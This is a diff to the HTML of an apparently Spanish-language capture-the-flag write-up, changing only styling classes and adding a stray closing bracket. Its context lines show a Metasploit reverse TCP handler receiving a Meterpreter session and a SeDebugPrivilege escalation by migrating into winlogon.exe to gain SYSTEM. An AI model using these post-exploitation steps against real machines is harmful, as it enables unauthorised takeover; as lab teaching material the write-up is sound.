@@ -1199,7 +1199,7 @@ C:\ProgramData></span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
+<code><span class="p">[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
 
 </span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.8.0.10:4444
 </span><span class="az">[*] </span><span class="p">Sending stage (176198 bytes) to 10.10.122.10
@@ -1212,7 +1212,7 @@ Server username: RAINBOW2\dev
 
 <p class="plain-text">Ahora para explotar el privilegio <code class="language-plaintext highlighter-rouge">SeDebugPrivilege</code> podemos simplemente migrar a un proceso con altos privilegios como el <code class="language-plaintext highlighter-rouge">winlogon.exe</code>, luego de migrar nos convertimos en el usuario que corre ese proceso, en este caso es el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">(</span><span class="ve">Meterpreter</span><span class="az"> 1</span><span class="p">)(C:\shared) > migrate -N winlogon.exe  
+<code><span class="p">(</span><span class="ve">Meterpreter</span><span class="az"> 1</span><span class="p">)(C:\shared) > migrate -N winlogon.exe  
 </span><span class="az">[*] </span><span class="p">Migrating from 2316 to 704...
 </span><span class="az">[*] </span><span class="p">Migration completed successfully.
 (</span><span class="ve">Meterpreter</span><span class="az"> 1</span><span class="p">)(C:\Windows\system32) > getuid
@@ -1234,3 +1234,4 @@ Server username: NT AUTHORITY\SYSTEM
     </div>
   </body>
 </html>
+>
